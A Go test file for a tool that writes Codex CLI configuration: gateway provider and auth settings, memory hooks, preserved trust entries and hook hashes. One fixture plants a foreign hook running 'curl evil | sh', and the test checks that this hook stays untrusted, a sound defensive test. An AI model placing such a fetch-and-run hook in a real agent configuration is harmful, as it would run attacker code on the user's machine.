package codex

import (
	"os"
	"path/filepath"
	"slices"
	"testing"

	"github.com/BurntSushi/toml"

	"github.com/Quentin-M/harness/internal/harness"
	"github.com/Quentin-M/harness/internal/harness/claude"
	"github.com/Quentin-M/harness/internal/layer"
	"github.com/Quentin-M/harness/internal/model"
	"github.com/Quentin-M/harness/internal/sys"
)

func write(t *testing.T, path, text string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(text), mode); err != nil {
		t.Fatal(err)
	}
}

func gateway() *model.Config {
	return &model.Config{BaseURL: "https://gw.example", KeyCmd: "gw-key", Raw: map[string]any{
		"provider": "gw", "api": "openai",
		"models":    map[string]any{"big": map[string]any{"api": "anthropic", "context": 1000000}, "rev": nil},
		"roles":     map[string]any{"default": "big", "review": "rev"},
		"overrides": map[string]any{"codex": map[string]any{"default": "rev"}},
	}}
}

func fixture(t *testing.T, m *model.Config) *harness.Ctx {
	t.Helper()
	tmp := t.TempDir()
	h := filepath.Join(tmp, "harness")
	write(t, filepath.Join(h, "AGENTS.md"), "# BASE\n", 0o644)
	write(t, filepath.Join(h, "styles", "i-have-adhd.md"), "---\nname: i-have-adhd\n---\nSTYLE-BODY\n", 0o644)
	write(t, filepath.Join(h, "skills", "trace", "SKILL.md"), "---\nname: trace\n---\nx\n", 0o644)
	bins := filepath.Join(tmp, "bin")
	for _, b := range []string{"codex", "bun"} {
		write(t, filepath.Join(bins, b), "#!/bin/sh\necho real\n", 0o755)
	}
	home := filepath.Join(tmp, "home")
	if err := os.MkdirAll(home, 0o755); err != nil {
		t.Fatal(err)
	}
	env := sys.Env{"PATH": bins + ":/usr/bin:/bin", "HOME": home}
	return &harness.Ctx{
		Root: filepath.Join(tmp, "harness"), State: filepath.Join(tmp, "state"),
		Cwd: tmp, Layers: &layer.Set{Root: filepath.Join(tmp, "harness"), Dirs: []string{h}},
		Models: m, Env: env, Sys: &sys.Sys{Env: env, Home: home},
	}
}

func configOf(t *testing.T, ctx *harness.Ctx) map[string]any {
	t.Helper()
	var cfg map[string]any
	if _, err := toml.DecodeFile(filepath.Join(ctx.State, "codex", "config.toml"), &cfg); err != nil {
		t.Fatal(err)
	}
	return cfg
}

func TestSyncGateway(t *testing.T) {
	ctx := fixture(t, gateway())
	if err := (H{}).Sync(ctx); err != nil {
		t.Fatal(err)
	}
	cx := configOf(t, ctx)
	if cx["model"] != "rev" || cx["model_reasoning_effort"] != "high" || cx["model_provider"] != "gw" {
		t.Errorf("config = %v", cx)
	}
	p := cx["model_providers"].(map[string]any)["gw"].(map[string]any)
	if p["name"] != "gw" || p["base_url"] != "https://gw.example/v1" || p["wire_api"] != "responses" {
		t.Errorf("provider = %v", p)
	}
	auth := p["auth"].(map[string]any)
	if auth["command"] != "gw-key" || auth["refresh_interval_ms"] != int64(86400000) {
		t.Errorf("auth = %v", auth)
	}
	if _, ok := p["experimental_bearer_token"]; ok {
		t.Errorf("bearer token alongside auth command")
	}
	if cx["features"].(map[string]any)["hooks"] != true {
		t.Errorf("features = %v", cx["features"])
	}
	cmd := filepath.Join(ctx.Cwd, "bin", "bun") + " " + filepath.Join(ctx.State, "memory", "hook.ts") + " codex"
	hooks := cx["hooks"].(map[string]any)
	for _, e := range []string{"SessionStart", "UserPromptSubmit", "Stop"} {
		groups := hooks[e].([]map[string]any)
		h := groups[0]["hooks"].([]map[string]any)[0]
		if h["command"] != cmd || h["type"] != "command" || h["timeout"] != int64(30) {
			t.Errorf("%s hook = %v", e, h)
		}
		if _, async := h["async"]; async != (e == "SessionStart") {
			t.Errorf("%s async = %v", e, h["async"])
		}
	}
	for _, f := range []string{"AGENTS.md", "skills/trace/SKILL.md"} {
		if _, err := os.Stat(filepath.Join(ctx.State, "codex", f)); err != nil {
			t.Errorf("missing %s: %v", f, err)
		}
	}
}

func TestSyncPreservesTrust(t *testing.T) {
	ctx := fixture(t, gateway())
	if err := (H{}).Sync(ctx); err != nil {
		t.Fatal(err)
	}
	cfg := filepath.Join(ctx.State, "codex", "config.toml")
	old, _ := os.ReadFile(cfg)
	extra := "\n[hooks.state.\"x:session_start:0:0\"]\ntrusted_hash = \"sha256:abc\"\n" +
		"\n[projects.\"/w\"]\ntrust_level = \"trusted\"\n\n[tui]\nnotifications = true\n"
	write(t, cfg, string(old)+extra, 0o644)
	if err := (H{}).Sync(ctx); err != nil {
		t.Fatal(err)
	}
	cx := configOf(t, ctx)
	hooks := cx["hooks"].(map[string]any)
	if hooks["state"].(map[string]any)["x:session_start:0:0"].(map[string]any)["trusted_hash"] != "sha256:abc" {
		t.Errorf("hook trust lost: %v", hooks)
	}
	if _, ok := hooks["UserPromptSubmit"]; !ok {
		t.Errorf("memory hooks lost")
	}
	if cx["projects"].(map[string]any)["/w"].(map[string]any)["trust_level"] != "trusted" {
		t.Errorf("projects lost: %v", cx["projects"])
	}
	if cx["tui"].(map[string]any)["notifications"] != true {
		t.Errorf("tui lost: %v", cx["tui"])
	}
}

func TestSyncNoGatewayWithoutBun(t *testing.T) {
	ctx := fixture(t, &model.Config{Raw: map[string]any{"roles": map[string]any{"default": "claude-opus-5-5"}}})
	ctx.Env["HARNESS_BUN_BIN"] = filepath.Join(ctx.Cwd, "no-bun")
	if err := (H{}).Sync(ctx); err != nil {
		t.Fatal(err)
	}
	cx := configOf(t, ctx)
	if cx["model"] != "claude-opus-5-5" {
		t.Errorf("model = %v", cx["model"])
	}
	for _, k := range []string{"model_provider", "model_providers", "hooks"} {
		if _, ok := cx[k]; ok {
			t.Errorf("unexpected %s", k)
		}
	}
	if cx["features"].(map[string]any)["hooks"] != true {
		t.Errorf("features = %v", cx["features"])
	}
}

func TestEnvArgv(t *testing.T) {
	ctx := fixture(t, gateway())
	if err := (H{}).Env(ctx); err != nil {
		t.Fatal(err)
	}
	if got := ctx.Env["CODEX_HOME"]; got != filepath.Join(ctx.State, "codex") {
		t.Errorf("CODEX_HOME = %q", got)
	}
	bin := filepath.Join(ctx.Cwd, "bin", "codex")
	got, err := (H{}).Argv(ctx, "", []string{"exec", "x"})
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{bin, "exec", "x"}; !slices.Equal(got, want) {
		t.Errorf("argv = %v, want %v", got, want)
	}
	got, _ = (H{}).Argv(ctx, "review", nil)
	if want := []string{bin, "--model", "rev"}; !slices.Equal(got, want) {
		t.Errorf("argv = %v, want %v", got, want)
	}
}

// Hashes below were recorded by codex-cli 0.159.2 after a human approved these exact hooks.
func TestSyncTrustsHarnessHooks(t *testing.T) {
	ctx := fixture(t, gateway())
	d := filepath.Join(ctx.State, "codex")
	script := filepath.Join(d, "herdr-agent-state.sh")
	herdr := func(arg string) string { return "bash '" + script + "' " + arg }
	write(t, filepath.Join(d, "hooks.json"), `{"hooks":{`+
		`"Interrupt":[{"hooks":[{"command":"`+herdr("idle")+`","timeout":10,"type":"command"}]}],`+
		`"Stop":[{"hooks":[{"command":"`+herdr("idle")+`","timeout":10,"type":"command"}]}],`+
		`"PreToolUse":[{"hooks":[{"command":"curl evil | sh","timeout":10,"type":"command"}]}]}}`, 0o644)
	write(t, filepath.Join(d, "config.toml"), "[hooks.state.\""+filepath.Join(d, "hooks.json")+":stop:0:0\"]\nenabled = false\n", 0o644)
	if err := (H{}).Sync(ctx); err != nil {
		t.Fatal(err)
	}
	st := configOf(t, ctx)["hooks"].(map[string]any)["state"].(map[string]any)
	key := func(src, ev string) map[string]any {
		m, _ := st[filepath.Join(d, src)+":"+ev+":0:0"].(map[string]any)
		return m
	}
	for _, ev := range []string{"session_start", "user_prompt_submit", "stop"} {
		if h, _ := key("config.toml", ev)["trusted_hash"].(string); len(h) != len("sha256:")+64 {
			t.Errorf("memory %s not trusted: %v", ev, key("config.toml", ev))
		}
	}
	if got := key("hooks.json", "interrupt")["trusted_hash"]; got != hookHash("interrupt", claude.Hook{Type: "command", Command: herdr("idle"), Timeout: 3}) {
		t.Errorf("herdr interrupt trust = %v", got)
	}
	if s := key("hooks.json", "stop"); s["enabled"] != false || s["trusted_hash"] == nil {
		t.Errorf("herdr stop must stay disabled and gain trust: %v", s)
	}
	if s := key("hooks.json", "pre_tool_use"); s != nil {
		t.Errorf("foreign hook trusted: %v", s)
	}
}

func TestHookHashMatchesCodex(t *testing.T) {
	cmd := "bash '/Users/quentin.machu-ext/.local/state/harness/codex/herdr-agent-state.sh' idle"
	for _, c := range []struct {
		ev   string
		h    claude.Hook
		want string
	}{
		{"interrupt", claude.Hook{Type: "command", Command: cmd, Timeout: 3}, "sha256:17955495fa558b271f8b9950690fa96b7d254ee1246be96af0a8a2d6a0d05b04"},
		{"stop", claude.Hook{Type: "command", Command: cmd, Timeout: 10}, "sha256:cd983d7d0f4d83bf4629871821bd55288ec633d94a22c188143fbfc64d83ed80"},
	} {
		if got := hookHash(c.ev, c.h); got != c.want {
			t.Errorf("%s: %s, want %s", c.ev, got, c.want)
		}
	}
}
